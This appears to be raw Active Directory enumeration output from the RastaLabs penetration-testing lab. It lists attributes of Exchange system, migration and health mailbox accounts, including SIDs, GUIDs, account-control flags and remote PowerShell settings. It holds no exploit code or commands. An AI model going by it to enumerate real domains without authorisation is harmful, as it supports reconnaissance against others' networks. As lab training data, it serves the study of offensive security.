name                                  : DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
accountexpires                        : NEVER
msexchmasteraccountsid                : {1, 1, 0, 0...}
msexchrecipienttypedetails            : 536870912
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                       : Migration.8f3e7716-2011-43e4-96b1-aba62d229136@rastalabs.local
instancetype                               : 4
msexchmailboxguid                          : {58, 12, 151, 155...}
logoncount                                 : 0
codepage                                   : 0
msexchrecipientsoftdeletedstatus           : 0
homemdb                                    : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative 
                                             Group (FYDIBOHF23SPDLT),CN=Administrative 
                                             Groups,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists                 : True
msexchdumpsterwarningquota                 : 20971520
samaccountname                             : SM_8e60c30a353c4b739
countrycode                                : 0
msexchmessagehygienesclquarantinethreshold : 9
userprincipalname                          : Migration.8f3e7716-2011-43e4-96b1-aba62d229136@rastalabs.local
proxyaddresses                             : SMTP:Migration.8f3e7716-2011-43e4-96b1-aba62d229136@rastalabs.local
useraccountcontrol                         : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                                 : 24905
dscorepropagationdata                      : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 
                                             16/12/2017 14:24:59...}
lastlogoff                                 : 01/01/1601 00:00:00
msexchmessagehygienesclrejectthreshold     : 7
msexchmailboxsecuritydescriptor            : {1, 0, 4, 128...}
msexchrecipientdisplaytype                 : 10
badpasswordtime                            : 01/01/1601 00:00:00
msexchuseraccountcontrol                   : 2
msexchaddressbookflags                     : 1
badpwdcount                                : 0
msexchmailboxauditenable                   : False
mdboverhardquotalimit                      : 307200
objectsid                                  : S-1-5-21-1396373213-2872852198-2033860859-1130
msexchprovisioningflags                    : 0
samaccounttype                             : USER_OBJECT
lastlogon                                  : 01/01/1601 00:00:00
displayname                                : Microsoft Exchange Migration
msexchversion                              : 1126140425011200
objectguid                                 : 7dc9744e-3304-4c04-9daa-cec697308cb7
objectclass                                : {top, person, organizationalPerson, user}
msexchumdtmfmap                            : {emailAddress:64472846683337716201143349621222623229136, 
                                             lastNameFirstName:64472846683337716201143349621222623229136, 
                                             firstNameLastName:64472846683337716201143349621222623229136}
legacyexchangedn                           : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipie
                                             nts/cn=b43a3cf58bd841d09833a5da9dfe07f3-Migration.8f3e
msexchhomeservername                       : /o=RastaLabs/ou=Exchange Administrative Group 
                                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
mdbusedefaults                             : False
objectcategory                             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit              : 7776000
usncreated                                 : 23751
mdboverquotalimit                          : 307200
msexchelcmailboxflags                      : 130
msexchwhenmailboxcreated                   : 15/10/2017 14:16:38
msexcharchivequota                         : 104857600
msexchcalendarloggingquota                 : 6291456
whencreated                                : 15/10/2017 13:39:02
msexchdumpsterquota                        : 31457280
pwdlastset                                 : 01/01/1601 00:00:00
msexchmessagehygienescldeletethreshold     : 9
whenchanged                                : 15/10/2017 14:16:38
distinguishedname                          : CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=rastalabs,DC
                                             =local
sn                                         : Migration.8f3e7716-2011-43e4-96b1-aba62d229136
cn                                         : Migration.8f3e7716-2011-43e4-96b1-aba62d229136
msexchbypassaudit                          : False
mailnickname                               : Migration.8f3e7716-2011-43e4-96b1-aba62d229136
msexchtransportrecipientsettingsflags      : 0
msexcharchivewarnquota                     : 94371840
mdbstoragequota                            : 153600
msexchcapabilityidentifiers                : 48
msexchpoliciesincluded                     : {91875021-0ff1-402a-8aaf-75370cd1345d, 
                                             {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                      : 6
msexchumenabledflags2                      : -1
name                                       : Migration.8f3e7716-2011-43e4-96b1-aba62d229136
msexchmessagehygienescljunkthreshold       : 4
accountexpires                             : NEVER
msexchmasteraccountsid                     : {1, 1, 0, 0...}
msexchrequireauthtosendto                  : True
msexchrecipienttypedetails                 : 8388608
msexchgroupsecurityflags                   : 0
primarygroupid                             : 513

mail                                       : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@rastalabs.local
instancetype                               : 4
msexchmailboxguid                          : {62, 253, 233, 68...}
logoncount                                 : 0
msexchrmscomputeraccountslink              : CN=MX01,OU=MX,OU=Member Servers,DC=rastalabs,DC=local
codepage                                   : 0
msexchrecipientsoftdeletedstatus           : 0
homemdb                                    : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative 
                                             Group (FYDIBOHF23SPDLT),CN=Administrative 
                                             Groups,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists                 : True
msexchdumpsterwarningquota                 : 20971520
samaccountname                             : SM_539c73abc80a42fa8
countrycode                                : 0
msexchmessagehygienesclquarantinethreshold : 9
userprincipalname                          : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@rastalabs.local
proxyaddresses                             : SMTP:FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@rastalabs.local
useraccountcontrol                         : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                                 : 24910
dscorepropagationdata                      : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 
                                             16/12/2017 14:24:59...}
lastlogoff                                 : 01/01/1601 00:00:00
msexchmessagehygienesclrejectthreshold     : 7
msexchmailboxsecuritydescriptor            : {1, 0, 4, 128...}
msexchrecipientdisplaytype                 : 10
badpasswordtime                            : 01/01/1601 00:00:00
msexchuseraccountcontrol                   : 2
msexchaddressbookflags                     : 1
badpwdcount                                : 0
msexchmailboxauditenable                   : False
mdboverhardquotalimit                      : 1024
objectsid                                  : S-1-5-21-1396373213-2872852198-2033860859-1131
msexchprovisioningflags                    : 0
samaccounttype                             : USER_OBJECT
lastlogon                                  : 01/01/1601 00:00:00
displayname                                : Microsoft Exchange Federation Mailbox
msexchversion                              : 1126140425011200
objectguid                                 : 1a6a8c81-c5ed-42d3-811f-4d0b6786bb04
objectclass                                : {top, person, organizationalPerson, user}
msexchumdtmfmap                            : {emailAddress:3333728333624542134382817941489323002953213042, 
                                             lastNameFirstName:3333728333624542134382817941489323002953213042, 
                                             firstNameLastName:3333728333624542134382817941489323002953213042}
legacyexchangedn                           : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipie
                                             nts/cn=7ac38b5cc468465787d2ba18f802ab3e-FederatedEmail
msexchhomeservername                       : /o=RastaLabs/ou=Exchange Administrative Group 
                                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
mdbusedefaults                             : False
objectcategory                             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit              : 7776000
usncreated                                 : 23756
mdboverquotalimit                          : 1024
msexchelcmailboxflags                      : 130
msexchwhenmailboxcreated                   : 15/10/2017 14:16:42
msexcharchivequota                         : 104857600
msexchcalendarloggingquota                 : 6291456
whencreated                                : 15/10/2017 13:39:02
msexchdumpsterquota                        : 31457280
pwdlastset                                 : 01/01/1601 00:00:00
msexchmessagehygienescldeletethreshold     : 9
whenchanged                                : 15/10/2017 14:16:42
distinguishedname                          : CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=rastala
                                             bs,DC=local
sn                                         : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
cn                                         : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
msexchbypassaudit                          : False
mailnickname                               : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
msexchtransportrecipientsettingsflags      : 0
msexcharchivewarnquota                     : 94371840
mdbstoragequota                            : 1024
msexchpoliciesincluded                     : {91875021-0ff1-402a-8aaf-75370cd1345d, 
                                             {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                      : 6
msexchumenabledflags2                      : -1
name                                       : FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
msexchmessagehygienescljunkthreshold       : 4
accountexpires                             : NEVER
msexchmasteraccountsid                     : {1, 1, 0, 0...}
msexchrecipienttypedetails                 : 8388608
msexchgroupsecurityflags                   : 0
primarygroupid                             : 513

mail                                       : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@rastalabs.local
instancetype                               : 4
msexchmailboxguid                          : {17, 147, 155, 250...}
logoncount                                 : 0
codepage                                   : 0
msexchrecipientsoftdeletedstatus           : 0
homemdb                                    : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative 
                                             Group (FYDIBOHF23SPDLT),CN=Administrative 
                                             Groups,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists                 : True
msexchdumpsterwarningquota                 : 20971520
samaccountname                             : SM_861d1de31283424ea
countrycode                                : 0
msexchmessagehygienesclquarantinethreshold : 9
userprincipalname                          : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@rastalabs.local
proxyaddresses                             : SMTP:SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@rastalabs.local
useraccountcontrol                         : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                                 : 24919
dscorepropagationdata                      : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 16/12/2017 14:25:33, 
                                             16/12/2017 14:24:59...}
msexchmessagehygienesclrejectthreshold     : 7
msexchapprovalapplicationlink              : {CN=ModeratedRecipients,CN=Approval 
                                             Applications,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                             CN=AutoGroup,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local}
msexchrecipientdisplaytype                 : 10
msexchuseraccountcontrol                   : 2
msexchaddressbookflags                     : 1
badpwdcount                                : 0
msexchmailboxauditenable                   : False
objectsid                                  : S-1-5-21-1396373213-2872852198-2033860859-1132
msexchprovisioningflags                    : 0
samaccounttype                             : USER_OBJECT
lastlogon                                  : 01/01/1601 00:00:00
mailnickname                               : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
displayname                                : Microsoft Exchange
msexchversion                              : 1126140425011200
objectguid                                 : 565ca8bf-b47f-4f9f-b960-700f4539b9df
msexchbypassaudit                          : False
objectclass                                : {top, person, organizationalPerson, user}
msexchumdtmfmap                            : {emailAddress:797836624526930340920239247209233222869203201, 
                                             lastNameFirstName:797836624526930340920239247209233222869203201, 
                                             firstNameLastName:797836624526930340920239247209233222869203201}
legacyexchangedn                           : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipie
                                             nts/cn=af2fd7e609724954b8287e4a56e19415-SystemMailbox{
msexchhomeservername                       : /o=RastaLabs/ou=Exchange Administrative Group 
                                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexchmailboxsecuritydescriptor            : {1, 0, 4, 128...}
objectcategory                             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit              : 7776000
usncreated                                 : 23761
msexchelcmailboxflags                      : 130
msexchwhenmailboxcreated                   : 15/10/2017 14:16:47
msexcharchivequota                         : 104857600
msexchcalendarloggingquota                 : 6291456
whencreated                                : 15/10/2017 13:39:02
msexchdumpsterquota                        : 31457280
pwdlastset                                 : 01/01/1601 00:00:00
msexchmessagehygienescldeletethreshold     : 9
whenchanged                                : 15/10/2017 14:16:47
distinguishedname                          : CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=rastala
                                             bs,DC=local
sn                                         : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
cn                                         : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
lastlogoff                                 : 01/01/1601 00:00:00
mdbusedefaults                             : False
msexchtransportrecipientsettingsflags      : 0
msexcharchivewarnquota                     : 94371840
badpasswordtime                            : 01/01/1601 00:00:00
msexchmailboxtemplatelink                  : CN=ArbitrationMailbox,CN=Retention Policies 
                                             Container,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                     : {91875021-0ff1-402a-8aaf-75370cd1345d, 
                                             {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                      : 6
msexchumenabledflags2                      : -1
name                                       : SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
msexchmessagehygienescljunkthreshold       : 4
accountexpires                             : NEVER
msexchmasteraccountsid                     : {1, 1, 0, 0...}
msexchrecipienttypedetails                 : 8388608
msexchgroupsecurityflags                   : 0
primarygroupid                             : 513

mail                                  : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {221, 47, 178, 18...}
logoncount                            : 0
codepage                              : 0
msexchrecipientsoftdeletedstatus      : 0
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : SM_f9fbfbb968474d339
countrycode                           : 0
userprincipalname                     : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@rastalabs.local
proxyaddresses                        : SMTP:SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@rastalabs.local
useraccountcontrol                    : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                            : 24923
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
primarygroupid                        : 513
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
mdboverhardquotalimit                 : 52428800
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1133
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
mailnickname                          : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 1126140425011200
objectguid                            : e6232fed-1f89-4617-8eb7-44b3a1e6b7e5
objectclass                           : {top, person, organizationalPerson, user}
msexchumdtmfmap                       : {emailAddress:797836624526982237033822242282926229423064129, 
                                        lastNameFirstName:797836624526982237033822242282926229423064129, 
                                        firstNameLastName:797836624526982237033822242282926229423064129}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=fb072c47a4d44123bb2a2f6ed3adca74-SystemMailbox{
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
displayname                           : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 23769
mdboverquotalimit                     : 52428800
msexchelcmailboxflags                 : 134
msexchwhenmailboxcreated              : 15/10/2017 14:16:51
msexcharchivequota                    : 104857600
msexchcalendarloggingquota            : 6291456
whencreated                           : 15/10/2017 13:39:02
msexchdumpsterquota                   : 52428800
pwdlastset                            : 01/01/1601 00:00:00
whenchanged                           : 15/10/2017 14:16:51
distinguishedname                     : CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=rastalabs,DC
                                        =local
sn                                    : SystemMailbox 8cc370d3-822a-4ab8-a926-bb94bd0641a9
cn                                    : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
msexchbypassaudit                     : False
mdbusedefaults                        : False
msexchtransportrecipientsettingsflags : 0
msexcharchivewarnquota                : 94371840
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 6
msexchumenabledflags2                 : -1
name                                  : SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
msexchuseraccountcontrol              : 2
accountexpires                        : NEVER
msexchmasteraccountsid                : {1, 1, 0, 0...}
msexchrecipienttypedetails            : 4398046511104
msexchgroupsecurityflags              : 0

mail                                  : HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {64, 107, 34, 163...}
logoncount                            : 65535
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox84ecfca
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
lastlogontimestamp                    : 13/03/2026 03:08:52
userprincipalname                     : HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc@rastalabs.local, 
                                        SIP:HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 1499398
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-Mailbox-Database-0721177190
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1139
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 13/03/2026 19:39:07
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 2474d2c6-7e49-4009-bff1-75d0e6a53b19
whencreated                           : 15/10/2017 14:24:46
msexchumdtmfmap                       : {emailAddress:432584624526984323222855343232025233362125032, 
                                        lastNameFirstName:432584624526969016245269328222730721177190, 
                                        firstNameLastName:432584624526969016245269328222730721177190}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=5d95c36820154ddbbc9ed3dba105217d-HealthMailbox8
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msexchmobilemailboxflags              : 1
displayname                           : HealthMailbox-mx01-Mailbox-Database-0721177190
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25196
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:24:45
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 13/03/2026 03:08:28
whenchanged                           : 13/03/2026 03:08:52
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {75, 128, 29, 91...}
cn                                    : HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox84ecfcab855d4f2fa0a52ff36c1c50dc
accountexpires                        : NEVER
msexchuserculture                     : en-US
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {125, 193, 252, 205...}
logoncount                            : 51131
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailboxbe893fc
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
lastlogontimestamp                    : 13/03/2026 03:09:43
userprincipalname                     : HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e@rastalabs.local, 
                                        SIP:HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 1499416
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-001
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1140
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 13/03/2026 03:10:32
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : bf7675aa-cb9e-4f12-90c1-b2ee47e767ba
whencreated                           : 15/10/2017 14:24:58
msexchumdtmfmap                       : {emailAddress:432584624526923893329393648362532424582526503, 
                                        lastNameFirstName:43258462452696901001, firstNameLastName:43258462452696901001}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=3b767a8f7f8942348b76fdb455438955-HealthMailboxb
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msexchmobilemailboxflags              : 1
displayname                           : HealthMailbox-mx01-001
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25211
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:24:58
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 13/03/2026 03:08:34
whenchanged                           : 13/03/2026 03:09:43
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {42, 239, 144, 225...}
cn                                    : HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e
msexchbypassaudit                     : False
mailnickname                          : HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailboxbe893fc9d9e648d6b5ec4c458a52650e
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailboxd829eae631a0452eb9c4452736e6ce44@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {85, 59, 88, 220...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailboxd829eae
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailboxd829eae631a0452eb9c4452736e6ce44@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailboxd829eae631a0452eb9c4452736e6ce44@rastalabs.local, 
                                        SIP:HealthMailboxd829eae631a0452eb9c4452736e6ce44@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25242
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-002
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1141
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 260bc2e0-caf3-4d40-9df6-a2142b37c877
whencreated                           : 15/10/2017 14:25:09
msexchumdtmfmap                       : {emailAddress:432584624526938293236312045232924452736362344, 
                                        lastNameFirstName:43258462452696901002, firstNameLastName:43258462452696901002}
